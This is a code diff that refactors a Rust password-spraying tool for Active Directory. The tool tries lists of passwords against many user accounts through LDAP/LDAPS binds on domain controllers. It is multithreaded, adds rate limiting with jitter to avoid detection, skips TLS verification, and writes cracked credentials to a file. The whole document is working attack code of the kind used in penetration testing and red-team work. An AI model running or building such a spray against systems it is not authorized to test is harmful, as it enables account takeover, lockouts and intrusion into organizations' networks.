@@ -1,16 +1,20 @@
 use crate::args::SprayArgs;
-use crate::help::add_terminal_spacing;
-use crate::help::get_timestamp;
-use chrono::Local;
-use ldap3::LdapConn;
+use crate::help::{add_terminal_spacing, get_timestamp};
+use ldap3::{LdapConn, LdapConnSettings};
+use std::collections::{HashMap, HashSet};
 use std::error::Error;
 use std::fs::File;
 use std::io::{self, BufRead, Write};
 use std::net::TcpStream;
 use std::path::Path;
+use std::sync::{Arc, Mutex};
 use std::thread;
-use std::time::Duration;
+use std::time::{Duration, Instant};
 
+const CONNECTION_TIMEOUT_SECS: u64 = 5;
+const MAX_CONCURRENT_THREADS: u32 = 50;
+
+#[derive(Debug, Clone)]
 pub struct SprayConfig {
     pub userfile: String,
     pub passwords: String,
@@ -22,13 +26,61 @@ pub struct SprayConfig {
     pub jitter: u32,
     pub delay: u64,
     pub continue_on_success: bool,
-    pub verbose: bool,
-    pub lockout_threshold: u32, // New
+    pub verbose: u8,
+    pub lockout_threshold: u32,
     pub lockout_window_seconds: u32,
+    pub use_ldaps: bool,
+}
+
+#[derive(Debug, Clone)]
+pub enum LoginResult {
+    Success,
+    InvalidCredentials,
+    AccountLocked,
+    AccountDisabled,
+    ConnectionError(String),
+    AuthenticationError(String),
+}
+
+#[derive(Debug, Clone)]
+struct AttemptResult {
+    username: String,
+    password: String,
+    domain: String,
+    dc: String,
+    result: LoginResult,
+    raw_error: Option<String>,
+    timestamp: Instant,
+}
+
+#[derive(Debug)]
+struct SprayState {
+    invalid_attempts: HashMap<String, (u32, Instant)>,
+    warned_users: HashSet<String>,
+    valid_credentials: Vec<AttemptResult>,
+    total_attempts: u32,
+    successful_attempts: u32,
+    last_attempt_time: Option<Instant>,
+}
+
+#[derive(Debug)]
+struct RateLimiter {
+    last_attempt: Arc<Mutex<Option<Instant>>>,
+    delay_ms: u64,
+    jitter_ms: u32,
 }
 
 impl SprayConfig {
     pub fn from_args(args: &SprayArgs) -> Result<Self, Box<dyn Error>> {
+        let threads = if args.threads > MAX_CONCURRENT_THREADS {
+            println!("[!] Warning: Thread count capped at {}", MAX_CONCURRENT_THREADS);
+            MAX_CONCURRENT_THREADS
+        } else if args.threads == 0 {
+            1
+        } else {
+            args.threads
+        };
+
         Ok(SprayConfig {
             userfile: args.userfile.clone(),
             passwords: args.password.clone(),
@@ -36,311 +88,629 @@ impl SprayConfig {
             dc_ip: args.dc_ip.clone(),
             hash: args.hash.clone(),
             timestamp_format: args.timestamp_format,
-            threads: args.threads,
+            threads,
             jitter: args.jitter,
             delay: args.delay,
             continue_on_success: args.continue_on_success,
             verbose: args.verbose,
-            lockout_threshold: args.lockout_threshold.unwrap_or(3), // Default: 3 attempts
-            lockout_window_seconds: args.lockout_window_seconds.unwrap_or(300), // Default: 300 seconds
+            lockout_threshold: args.lockout_threshold.unwrap_or(3),
+            lockout_window_seconds: args.lockout_window_seconds.unwrap_or(300),
+            use_ldaps: false, // Will be auto-detected or set via args
         })
     }
 }
 
-pub enum LoginResult {
-    Success,
-    InvalidCredentials,
-    AccountLocked,
-    AccountDisabled,
-    Failed,
+impl SprayState {
+    fn new() -> Self {
+        Self {
+            invalid_attempts: HashMap::new(),
+            warned_users: HashSet::new(),
+            valid_credentials: Vec::new(),
+            total_attempts: 0,
+            successful_attempts: 0,
+            last_attempt_time: None,
+        }
+    }
 }
 
-pub fn start_password_spray(config: SprayConfig) -> Result<(), Box<dyn Error>> {
-    let lockout_threshold = config.lockout_threshold;
-    let lockout_window_seconds = config.lockout_window_seconds;
-    let mut invalid_attempts: std::collections::HashMap<String, (u32, std::time::Instant)> =
-        std::collections::HashMap::new();
-    let mut warned_users = std::collections::HashSet::new(); // Keep track of warned users
-
-    add_terminal_spacing(1);
-    println!("[*] Domain: {}", config.domain);
-
-    // Filter reachable domain controllers
-    println!("[*] Testing connectivity for Domain Controllers...");
-    let reachable_dcs: Vec<String> = config
-        .dc_ip
-        .iter()
-        .filter_map(|dc| {
-            if let Ok(_) = check_ldap_port(dc, 389, Duration::from_secs(5)) {
-                println!("[+] Successfully connected to {}", dc);
-                Some(dc.clone())
-            } else {
-                println!("[-] Failed to connect to {}", dc);
-                None
-            }
-        })
-        .collect();
-
-    if reachable_dcs.is_empty() {
-        return Err("No reachable Domain Controllers.".into());
-    }
-
-    println!("[*] Reachable Domain Controllers: {:?}", reachable_dcs);
-
-    let users = read_users(&config.userfile)?;
-    let passwords = read_passwords(&config.passwords)?;
-
-    println!("[*] Loaded {} users", users.len());
-    println!("[*] Loaded {} passwords", passwords.len());
-    println!("[*] Lockout Threshold: {} attempts", lockout_threshold);
-    println!("[*] Lockout Window: {} seconds\n", lockout_window_seconds);
-    println!("[*] Starting password spray at {}\n", get_timestamp());
-
-    let timestamp = Local::now().format("%Y%m%d_%H%M%S");
-    let output_file = format!("found_credentials_{}.txt", timestamp);
-    let mut found_creds: Option<File> = None;
-    let mut valid_credentials_found = false;
-
-    let mut dc_index = 0; // Index to rotate domain controllers
-
-    for (password_index, password) in passwords.iter().enumerate() {
-        println!(
-            "\n[*] Testing password: '{}' ({}/{} passwords)",
-            password,
-            password_index + 1,
-            passwords.len()
-        );
-
-        for user in &users {
-            let current_dc = &reachable_dcs[dc_index];
-            dc_index = (dc_index + 1) % reachable_dcs.len(); // Rotate DCs
-
-            match try_login(
-                &format!("ldap://{}", current_dc),
-                user,
-                password,
-                &config.domain,
-                config.verbose,
-            ) {
-                Ok(LoginResult::Success) => {
-                    // Handle successful login
-                    if found_creds.is_none() {
-                        found_creds = Some(File::create(&output_file)?);
-                    }
-
-                    let success_msg = format!(
-                        "[+] Valid credentials found!\n    Username: {}\n    Password: {}\n    Domain: {}\n    Server: {}\n",
-                        user, password, config.domain, current_dc
-                    );
-                    println!("\x1b[32m{}\x1b[0m", success_msg.trim());
-
-                    if let Some(file) = &mut found_creds {
-                        file.write_all(success_msg.as_bytes())?;
-                        file.flush()?;
-                    }
-                    valid_credentials_found = true;
-
-                    if !config.continue_on_success {
-                        println!("[*] Valid credentials found and continue_on_success is false. Stopping spray.");
-                        return Ok(());
-                    }
-                }
-                Ok(LoginResult::InvalidCredentials) => {
-                    println!(
-                        "[-] Failed login: {}@{} with password: {}",
-                        user, config.domain, password
-                    );
-
-                    let entry = invalid_attempts
-                        .entry(user.clone())
-                        .or_insert((0, std::time::Instant::now()));
-                    entry.0 += 1;
-
-                    if entry.0 > lockout_threshold
-                        && entry.1.elapsed().as_secs() <= lockout_window_seconds as u64
-                        && !warned_users.contains(user)
-                    {
-                        println!(
-                            "\x1b[33m[!] Warning: {} has reached the lockout threshold ({} attempts in {} seconds)\x1b[0m",
-                            user, lockout_threshold, lockout_window_seconds
-                        );
-                        println!("[!] Do you want to continue spraying? (yes/no): ");
-
-                        let mut response = String::new();
-                        std::io::stdin().read_line(&mut response)?;
-                        if matches!(response.trim().to_lowercase().as_str(), "no" | "n") {
-                            println!("[*] Aborting spray as per user request.");
-                            return Ok(());
-                        } else {
-                            println!("[*] Continuing spray...");
-                            warned_users.insert(user.clone());
-                        }
-                    }
-
-                    if entry.1.elapsed().as_secs() > lockout_window_seconds as u64 {
-                        entry.0 = 1;
-                        entry.1 = std::time::Instant::now();
-                    }
-                }
-                Ok(LoginResult::AccountLocked) => {
-                    println!(
-                        "\x1b[31m[!] Account locked: {}@{}\x1b[0m",
-                        user, config.domain
-                    );
-                }
-                Ok(LoginResult::AccountDisabled) => {
-                    println!(
-                        "\x1b[31m[!] Account disabled: {}@{}\x1b[0m",
-                        user, config.domain
-                    );
-                }
-                Ok(LoginResult::Failed) => {
-                    println!(
-                        "\x1b[31m[!] Failed login due to unknown reasons: {}@{}\x1b[0m",
-                        user, config.domain
-                    );
-                }
-                Err(e) => {
-                    eprintln!(
-                        "\x1b[31m[!] Connection Error: {}@{} on {} - {}\x1b[0m",
-                        user, config.domain, current_dc, e
-                    );
-                }
-            }
-
-            // Delay between attempts
-            if config.delay > 0 {
-                thread::sleep(Duration::from_secs(config.delay));
-            }
+impl RateLimiter {
+    fn new(delay_ms: u64, jitter_ms: u32) -> Self {
+        Self {
+            last_attempt: Arc::new(Mutex::new(None)),
+            delay_ms,
+            jitter_ms,
         }
     }
 
-    println!("\n[*] Password spray complete at {}\n", get_timestamp());
-    if valid_credentials_found {
-        println!(
-            "[+] Valid credentials were found and saved to: {}",
-            output_file
-        );
+    fn wait_if_needed(&self, verbose: u8) {
+        let mut last = self.last_attempt.lock().unwrap();
+        
+        if let Some(last_time) = *last {
+            let elapsed = last_time.elapsed();
+            let base_delay = Duration::from_millis(self.delay_ms);
+            let jitter = if self.jitter_ms > 0 {
+                Duration::from_millis(fastrand::u32(0..=self.jitter_ms) as u64)
+            } else {
+                Duration::from_millis(0)
+            };
+            
+            let total_delay = base_delay + jitter;
+            
+            if elapsed < total_delay {
+                let sleep_time = total_delay - elapsed;
+                if verbose >= 2 {
+                    println!("[DEBUG] Rate limiting: sleeping for {:?} ({}s base + {}ms jitter)", 
+                            sleep_time, self.delay_ms / 1000, jitter.as_millis());
+                }
+                drop(last); // Release the lock before sleeping
+                thread::sleep(sleep_time);
+                let mut last = self.last_attempt.lock().unwrap();
+                *last = Some(Instant::now());
+            } else {
+                *last = Some(Instant::now());
+            }
+        } else {
+            *last = Some(Instant::now());
+        }
+    }
+}
+
+pub fn start_password_spray(config: SprayConfig) -> Result<(), Box<dyn Error>> {
+    display_spray_banner(&config);
+    
+    let reachable_dcs = test_domain_controllers(&config.dc_ip)?;
+    if reachable_dcs.is_empty() {
+        return Err("No reachable Domain Controllers found".into());
+    }
+
+    let users = load_input_list(&config.userfile)?;
+    let passwords = load_input_list(&config.passwords)?;
+
+    print_spray_info(&config, &users, &passwords, &reachable_dcs);
+
+    let state = Arc::new(Mutex::new(SprayState::new()));
+
+    execute_spray(&config, users, passwords, reachable_dcs, state.clone())?;
+    
+    // Create output file only if we have credentials to save
+    let output_file = {
+        let state_guard = state.lock().unwrap();
+        if !state_guard.valid_credentials.is_empty() {
+            Some(create_output_file()?)
+        } else {
+            None
+        }
+    };
+    
+    finalize_spray(&config, state, output_file)?;
+    Ok(())
+}
+
+fn display_spray_banner(config: &SprayConfig) {
+    add_terminal_spacing(1);
+    let timestamp_prefix = if config.timestamp_format {
+        format!("[{}] ", get_timestamp())
     } else {
-        println!("[-] No valid credentials were found");
+        String::new()
+    };
+    println!("{}[*] Domain: {}", timestamp_prefix, config.domain);
+}
+
+fn test_domain_controllers(dc_list: &[String]) -> Result<Vec<String>, Box<dyn Error>> {
+    println!("[*] Testing connectivity to Domain Controllers...");
+    let mut reachable_dcs = Vec::new();
+
+    for dc in dc_list {
+        // Test both LDAP and LDAPS ports
+        let ldap_reachable = test_port(dc, 389);
+        let ldaps_reachable = test_port(dc, 636);
+
+        if ldap_reachable || ldaps_reachable {
+            println!("[+] Successfully connected to {} (LDAP: {}, LDAPS: {})", 
+                    dc, 
+                    if ldap_reachable { "✓" } else { "✗" },
+                    if ldaps_reachable { "✓" } else { "✗" }
+            );
+            reachable_dcs.push(dc.clone());
+        } else {
+            println!("[-] Failed to connect to {}", dc);
+        }
+    }
+
+    Ok(reachable_dcs)
+}
+
+fn test_port(host: &str, port: u16) -> bool {
+    TcpStream::connect_timeout(
+        &format!("{}:{}", host, port).parse().unwrap(),
+        Duration::from_secs(CONNECTION_TIMEOUT_SECS)
+    ).is_ok()
+}
+
+fn load_input_list(input: &str) -> Result<Vec<String>, Box<dyn Error>> {
+    if Path::new(input).exists() {
+        load_file_lines(input)
+    } else {
+        Ok(vec![input.to_string()])
+    }
+}
+
+fn load_file_lines(filename: &str) -> Result<Vec<String>, Box<dyn Error>> {
+    let file = File::open(filename)?;
+    let lines: Result<Vec<_>, _> = io::BufReader::new(file)
+        .lines()
+        .map(|line| line.map(|l| l.trim().to_string()))
+        .filter(|line| match line {
+            Ok(l) => !l.is_empty(),
+            Err(_) => true,
+        })
+        .collect();
+    Ok(lines?)
+}
+
+fn print_spray_info(config: &SprayConfig, users: &[String], passwords: &[String], dcs: &[String]) {
+    let timestamp_prefix = if config.timestamp_format {
+        format!("[{}] ", get_timestamp())
+    } else {
+        String::new()
+    };
+    
+    println!("{}[*] Loaded {} users", timestamp_prefix, users.len());
+    println!("{}[*] Loaded {} passwords", timestamp_prefix, passwords.len());
+    println!("{}[*] Reachable Domain Controllers: {:?}", timestamp_prefix, dcs);
+    println!("{}[*] Threads: {}", timestamp_prefix, config.threads);
+    println!("{}[*] Delay: {}s + {}ms jitter", timestamp_prefix, config.delay, config.jitter);
+    println!("{}[*] Lockout Threshold: {} attempts in {} seconds", timestamp_prefix, config.lockout_threshold, config.lockout_window_seconds);
+    println!("{}[*] Verbosity Level: {}", timestamp_prefix, config.verbose);
+    if config.timestamp_format {
+        println!("{}[*] Timestamps enabled", timestamp_prefix);
+    }
+    println!("{}[*] Starting password spray\n", timestamp_prefix);
+}
+
+fn execute_spray(
+    config: &SprayConfig,
+    users: Vec<String>,
+    passwords: Vec<String>,
+    dcs: Vec<String>,
+    state: Arc<Mutex<SprayState>>,
+) -> Result<(), Box<dyn Error>> {
+    // Create rate limiter for global delay/jitter control
+    let rate_limiter = Arc::new(RateLimiter::new(config.delay * 1000, config.jitter));
+    let total_combinations = users.len() * passwords.len();
+    let mut completed_attempts = 0;
+    
+    let timestamp_prefix = if config.timestamp_format {
+        format!("[{}] ", get_timestamp())
+    } else {
+        String::new()
+    };
+    
+    for (password_index, password) in passwords.iter().enumerate() {
+        println!("\n{}[*] Testing password: '{}' ({}/{} passwords)", 
+                timestamp_prefix, password, password_index + 1, passwords.len());
+        
+        if config.verbose >= 1 && config.delay > 0 {
+            println!("{}[*] Using {}s delay + {}ms jitter between attempts...", 
+                    timestamp_prefix, config.delay, config.jitter);
+        }
+        
+        // Create work items for this password only
+        let mut work_items = Vec::new();
+        for (user_index, username) in users.iter().enumerate() {
+            let dc_index = user_index % dcs.len();
+            let selected_dc = &dcs[dc_index];
+            
+            work_items.push(WorkItem {
+                username: username.clone(),
+                password: password.clone(),
+                dc: selected_dc.clone(),
+                password_index,
+            });
+        }
+
+        // Process this password's attempts with real-time results
+        let early_stop = process_password_batch_realtime(config, work_items, rate_limiter.clone(), state.clone())?;
+        
+        completed_attempts += users.len();
+        
+        if config.verbose >= 1 {
+            println!("\n{}[*] Completed password '{}' ({}/{} total attempts)", 
+                    timestamp_prefix, password, completed_attempts, total_combinations);
+        }
+
+        // Check for early termination
+        if early_stop {
+            println!("{}[*] Stopping spray due to successful login or user request.", timestamp_prefix);
+            break;
+        }
+
+        // Check if we should stop due to lockout concerns
+        if should_stop_spray(config, state.clone())? {
+            break;
+        }
+
+        // Small delay between passwords
+        if password_index < passwords.len() - 1 {
+            thread::sleep(Duration::from_millis(500));
+        }
     }
 
     Ok(())
 }
 
-fn try_login(
-    ldap_url: &str,
+#[derive(Debug, Clone)]
+struct WorkItem {
+    username: String,
+    password: String,
+    dc: String,
+    password_index: usize,
+}
+
+fn process_password_batch_realtime(
+    config: &SprayConfig, 
+    work_items: Vec<WorkItem>,
+    rate_limiter: Arc<RateLimiter>,
+    state: Arc<Mutex<SprayState>>,
+) -> Result<bool, Box<dyn Error>> {
+    use std::sync::mpsc;
+    
+    let (work_tx, work_rx) = mpsc::channel();
+    let (result_tx, result_rx) = mpsc::channel();
+    
+    // Send all work items
+    for item in work_items {
+        work_tx.send(item)?;
+    }
+    drop(work_tx);
+
+    // Create worker threads - limit to the configured number
+    let work_rx = Arc::new(Mutex::new(work_rx));
+    let mut handles = Vec::new();
+    let actual_threads = std::cmp::min(config.threads as usize, 50);
+
+    if config.verbose >= 2 {
+        println!("[DEBUG] Starting {} worker threads with {}s delay + {}ms jitter", 
+                actual_threads, config.delay, config.jitter);
+    }
+
+    for thread_id in 0..actual_threads {
+        let work_rx_clone = Arc::clone(&work_rx);
+        let result_tx_clone = result_tx.clone();
+        let config_clone = config.clone();
+        let rate_limiter_clone = Arc::clone(&rate_limiter);
+
+        let handle = thread::spawn(move || {
+            if config_clone.verbose >= 2 {
+                println!("[DEBUG] Worker thread {} started", thread_id);
+            }
+
+            while let Ok(work_item) = {
+                let rx = work_rx_clone.lock().unwrap();
+                rx.recv()
+            } {
+                // Apply global rate limiting before each attempt
+                rate_limiter_clone.wait_if_needed(config_clone.verbose);
+
+                if config_clone.verbose >= 2 {
+                    println!("[DEBUG] Thread {} processing {}@{}", 
+                            thread_id, work_item.username, config_clone.domain);
+                }
+
+                let result = attempt_login(&config_clone, &work_item.username, &work_item.password, &work_item.dc);
+
+                let attempt_result = AttemptResult {
+                    username: work_item.username,
+                    password: work_item.password,
+                    domain: config_clone.domain.clone(),
+                    dc: work_item.dc,
+                    result: result.0,
+                    raw_error: result.1,
+                    timestamp: Instant::now(),
+                };
+
+                if result_tx_clone.send(attempt_result).is_err() {
+                    break;
+                }
+            }
+
+            if config_clone.verbose >= 2 {
+                println!("[DEBUG] Worker thread {} finished", thread_id);
+            }
+        });
+
+        handles.push(handle);
+    }
+
+    // Drop the main result sender so the channel closes when all workers finish
+    drop(result_tx);
+
+    // Process results in real-time as they come in
+    let mut early_stop = false;
+    let mut results_processed = 0;
+    
+    while let Ok(result) = result_rx.recv() {
+        // Process and display result immediately
+        if let Err(e) = process_attempt_result_realtime(config, &result, state.clone()) {
+            eprintln!("[!] Error processing result: {}", e);
+            early_stop = true;
+            break;
+        }
+
+        // Check for early termination after each successful login
+        if matches!(result.result, LoginResult::Success) && !config.continue_on_success {
+            early_stop = true;
+            break;
+        }
+
+        results_processed += 1;
+    }
+
+    // Wait for all threads to complete
+    for handle in handles {
+        handle.join().unwrap_or(());
+    }
+
+    if config.verbose >= 2 {
+        println!("[DEBUG] All worker threads completed, {} results processed", results_processed);
+    }
+
+    Ok(early_stop)
+}
+
+fn attempt_login(
+    config: &SprayConfig,
+    username: &str,
+    password: &str,
+    dc: &str,
+) -> (LoginResult, Option<String>) {
+    // Try LDAPS first, then LDAP
+    let protocols = if config.use_ldaps { 
+        vec![("ldaps", 636)] 
+    } else { 
+        vec![("ldaps", 636), ("ldap", 389)] 
+    };
+
+    for (protocol, _port) in protocols {
+        match try_ldap_login(protocol, dc, username, password, &config.domain, config.verbose) {
+            Ok(result) => return (result, None),
+            Err(e) => {
+                if protocol == "ldap" {
+                    return (LoginResult::ConnectionError(e.to_string()), Some(e.to_string()));
+                }
+                // Continue to LDAP if LDAPS fails
+            }
+        }
+    }
+
+    (LoginResult::ConnectionError("All protocols failed".to_string()), None)
+}
+
+fn try_ldap_login(
+    protocol: &str,
+    dc: &str,
     username: &str,
     password: &str,
     domain: &str,
-    verbose: bool, // Pass verbose flag
+    verbose: u8,
 ) -> Result<LoginResult, Box<dyn Error>> {
-    if verbose {
-        eprintln!(
-            "[DEBUG] Attempting LDAP bind → {} on {}",
-            username, ldap_url
-        );
+    let ldap_url = format!("{}://{}", protocol, dc);
+    
+    if verbose >= 2 {
+        println!("[DEBUG] Attempting {} bind → {}@{} on {}", protocol.to_uppercase(), username, domain, ldap_url);
     }
 
-    let mut ldap = LdapConn::new(ldap_url)?;
+    let settings = LdapConnSettings::new()
+        .set_conn_timeout(Duration::from_secs(CONNECTION_TIMEOUT_SECS))
+        .set_no_tls_verify(true);
 
-    let bind_dn = format!("{}@{}", username.trim(), domain);
-    let result = ldap.simple_bind(&bind_dn, password);
-
-    match result {
-        Ok(ldap_result) => {
-            if verbose {
-                eprintln!("[DEBUG] LDAP bind successful. Checking for errors...");
+    let mut ldap = LdapConn::with_settings(settings, &ldap_url)
+        .map_err(|e| {
+            if verbose >= 2 {
+                println!("[DEBUG] Failed to create {} connection: {}", protocol.to_uppercase(), e);
             }
+            e
+        })?;
+    
+    let bind_dn = format!("{}@{}", username.trim(), domain);
+    
+    match ldap.simple_bind(&bind_dn, password) {
+        Ok(ldap_result) => {
             match ldap_result.success() {
-                Ok(_) => Ok(LoginResult::Success),
-                Err(e) => {
-                    if verbose {
-                        eprintln!("[DEBUG] Unsuccessful bind: {:?}", e);
+                Ok(_) => {
+                    if verbose >= 2 {
+                        println!("[DEBUG] Successful {} bind for {}", protocol.to_uppercase(), bind_dn);
                     }
-                    extract_and_match_error_code(&e, verbose)
+                    Ok(LoginResult::Success)
+                }
+                Err(e) => {
+                    if verbose >= 2 {
+                        println!("[DEBUG] {} bind failed for {}: {:?}", protocol.to_uppercase(), bind_dn, e);
+                    }
+                    Ok(parse_ldap_error(&e))
                 }
             }
         }
         Err(e) => {
-            if verbose {
-                eprintln!("[DEBUG] LDAP bind failed: {:?}", e);
+            if verbose >= 2 {
+                println!("[DEBUG] {} connection failed for {}: {:?}", protocol.to_uppercase(), bind_dn, e);
             }
-            extract_and_match_error_code(&e, verbose)
+            Err(Box::new(e))
         }
     }
 }
 
-fn extract_and_match_error_code(
-    err: &dyn std::error::Error,
-    verbose: bool,
-) -> Result<LoginResult, Box<dyn Error>> {
-    let raw_error = err.to_string();
-    if verbose {
-        eprintln!("[DEBUG] Raw error text: {}", raw_error);
-    }
-
-    if let Some(sub_error_code) = extract_sub_error_code(&raw_error) {
-        if verbose {
-            eprintln!("[DEBUG] Extracted sub-error code: {}", sub_error_code);
-        }
+fn parse_ldap_error(error: &dyn Error) -> LoginResult {
+    let error_str = error.to_string();
+    
+    if let Some(sub_error_code) = extract_ldap_sub_error(&error_str) {
         match sub_error_code.as_str() {
-            "775" => Ok(LoginResult::AccountLocked),
-            "533" => Ok(LoginResult::AccountDisabled),
-            _ => Ok(LoginResult::InvalidCredentials),
+            "775" => LoginResult::AccountLocked,
+            "533" => LoginResult::AccountDisabled,
+            _ => LoginResult::InvalidCredentials,
         }
     } else {
-        if verbose {
-            eprintln!("[DEBUG] No sub-error code found. Treating as failed login.");
-        }
-        Ok(LoginResult::InvalidCredentials)
+        LoginResult::InvalidCredentials
     }
 }
 
-fn extract_sub_error_code(raw_error: &str) -> Option<String> {
-    raw_error
+fn extract_ldap_sub_error(error_str: &str) -> Option<String> {
+    error_str
         .split("data ")
         .nth(1)
         .and_then(|data| data.split(',').next())
         .map(|code| code.trim().to_string())
 }
 
-fn read_lines<P>(filename: P) -> io::Result<Vec<String>>
-where
-    P: AsRef<Path>,
-{
-    let file = File::open(filename)?;
-    let lines = io::BufReader::new(file)
-        .lines()
-        .filter_map(|line| line.ok())
-        .filter(|line| !line.trim().is_empty())
-        .collect();
-    Ok(lines)
-}
+fn process_attempt_result_realtime(
+    config: &SprayConfig,
+    attempt: &AttemptResult,
+    state: Arc<Mutex<SprayState>>,
+) -> Result<(), Box<dyn Error>> {
+    let mut state_guard = state.lock().unwrap();
+    state_guard.total_attempts += 1;
 
-fn read_users(user_input: &str) -> io::Result<Vec<String>> {
-    // If the input looks like a file path, try to read it
-    if Path::new(user_input).exists() {
-        read_lines(user_input)
+    let timestamp_prefix = if config.timestamp_format {
+        format!("[{}] ", get_timestamp())
     } else {
-        // If not a file, treat it as a direct username
-        Ok(vec![user_input.to_string()])
+        String::new()
+    };
+
+    match &attempt.result {
+        LoginResult::Success => {
+            state_guard.successful_attempts += 1;
+            state_guard.valid_credentials.push(attempt.clone());
+            
+            println!("{}[+] \x1b[32mValid credentials found!\x1b[0m", timestamp_prefix);
+            println!("{}    Username: {}", timestamp_prefix, attempt.username);
+            println!("{}    Password: {}", timestamp_prefix, attempt.password);
+            println!("{}    Domain: {}", timestamp_prefix, attempt.domain);
+            println!("{}    Server: {}", timestamp_prefix, attempt.dc);
+        }
+        LoginResult::InvalidCredentials => {
+            if config.verbose >= 1 {
+                println!("{}[-] Failed login: {}@{} with password: {}", 
+                        timestamp_prefix, attempt.username, attempt.domain, attempt.password);
+            }
+            
+            // Track failed attempts for lockout protection
+            let should_warn = {
+                let entry = state_guard.invalid_attempts.entry(attempt.username.clone())
+                    .or_insert((0, Instant::now()));
+                entry.0 += 1;
+
+                // Check if we should warn (before checking warned_users to avoid borrow conflicts)
+                let exceeds_threshold = entry.0 >= config.lockout_threshold;
+                let within_window = entry.1.elapsed().as_secs() <= config.lockout_window_seconds as u64;
+                
+                // Reset counter if outside the lockout window
+                if !within_window {
+                    entry.0 = 1;
+                    entry.1 = Instant::now();
+                }
+                
+                exceeds_threshold && within_window
+            };
+
+            // Check if we should warn about lockout (separate from the entry borrow)
+            if should_warn && !state_guard.warned_users.contains(&attempt.username) {
+                let current_attempts = state_guard.invalid_attempts.get(&attempt.username)
+                    .map(|(count, _)| *count)
+                    .unwrap_or(0);
+                    
+                println!("{}[!] \x1b[33mWARNING: {} has {} failed attempts within {} seconds - approaching lockout threshold!\x1b[0m",
+                        timestamp_prefix, attempt.username, current_attempts, config.lockout_window_seconds);
+                
+                // Ask user if they want to continue
+                print!("{}[!] Continue spraying this user? (y/n): ", timestamp_prefix);
+                io::stdout().flush()?;
+                
+                let mut response = String::new();
+                io::stdin().read_line(&mut response)?;
+                
+                if !matches!(response.trim().to_lowercase().as_str(), "y" | "yes") {
+                    return Err(format!("User requested to stop spraying {} due to lockout concerns", attempt.username).into());
+                }
+                
+                state_guard.warned_users.insert(attempt.username.clone());
+            }
+        }
+        LoginResult::AccountLocked => {
+            println!("{}[!] \x1b[31mAccount locked: {}@{}\x1b[0m", 
+                    timestamp_prefix, attempt.username, attempt.domain);
+        }
+        LoginResult::AccountDisabled => {
+            println!("{}[!] \x1b[31mAccount disabled: {}@{}\x1b[0m", 
+                    timestamp_prefix, attempt.username, attempt.domain);
+        }
+        LoginResult::ConnectionError(msg) | LoginResult::AuthenticationError(msg) => {
+            if config.verbose >= 1 {
+                println!("{}[!] \x1b[31mConnection error: {}@{} on {} - {}\x1b[0m", 
+                        timestamp_prefix, attempt.username, attempt.domain, attempt.dc, msg);
+            }
+        }
     }
+
+    Ok(())
 }
 
-fn read_passwords(password_input: &str) -> io::Result<Vec<String>> {
-    // If the input looks like a file path, try to read it
-    if Path::new(password_input).exists() {
-        read_lines(password_input)
+fn should_stop_spray(
+    config: &SprayConfig,
+    state: Arc<Mutex<SprayState>>,
+) -> Result<bool, Box<dyn Error>> {
+    let state_guard = state.lock().unwrap();
+    
+    // Only print success summary if we have successful attempts and verbose >= 1
+    if state_guard.successful_attempts > 0 && config.verbose >= 1 {
+        let timestamp_prefix = if config.timestamp_format {
+            format!("[{}] ", get_timestamp())
+        } else {
+            String::new()
+        };
+        println!("{}[*] {} successful authentication(s) found so far", 
+                timestamp_prefix, state_guard.successful_attempts);
+    }
+
+    Ok(false)
+}
+
+fn create_output_file() -> Result<File, Box<dyn Error>> {
+    let timestamp = chrono::Local::now().format("%Y%m%d_%H%M%S");
+    let filename = format!("found_credentials_{}.txt", timestamp);
+    Ok(File::create(filename)?)
+}
+
+fn finalize_spray(
+    config: &SprayConfig,
+    state: Arc<Mutex<SprayState>>,
+    mut output_file: Option<File>,
+) -> Result<(), Box<dyn Error>> {
+    let state_guard = state.lock().unwrap();
+    
+    println!("\n[*] Password spray complete at {}", get_timestamp());
+    println!("[*] Total attempts: {}", state_guard.total_attempts);
+    println!("[*] Successful attempts: {}", state_guard.successful_attempts);
+
+    if !state_guard.valid_credentials.is_empty() {
+        let timestamp = chrono::Local::now().format("%Y%m%d_%H%M%S");
+        let filename = format!("found_credentials_{}.txt", timestamp);
+        
+        if let Some(ref mut file) = output_file {
+            for cred in &state_guard.valid_credentials {
+                let success_msg = format!(
+                    "[+] Valid credentials: {}@{} : {} (Server: {})\n",
+                    cred.username, cred.domain, cred.password, cred.dc
+                );
+                file.write_all(success_msg.as_bytes())?;
+            }
+            file.flush()?;
+            println!("[+] {} valid credential(s) found and saved to: {}", state_guard.valid_credentials.len(), filename);
+        } else {
+            println!("[+] {} valid credential(s) found", state_guard.valid_credentials.len());
+        }
     } else {
-        // If not a file, treat it as a direct password
-        Ok(vec![password_input.to_string()])
+        println!("[-] No valid credentials found");
     }
-}
 
-fn check_ldap_port(host: &str, port: u16, _timeout: Duration) -> Result<(), Box<dyn Error>> {
-    match TcpStream::connect((host, port)) {
-        Ok(_) => Ok(()),
-        Err(e) => Err(Box::new(e)),
-    }
+    Ok(())
 }
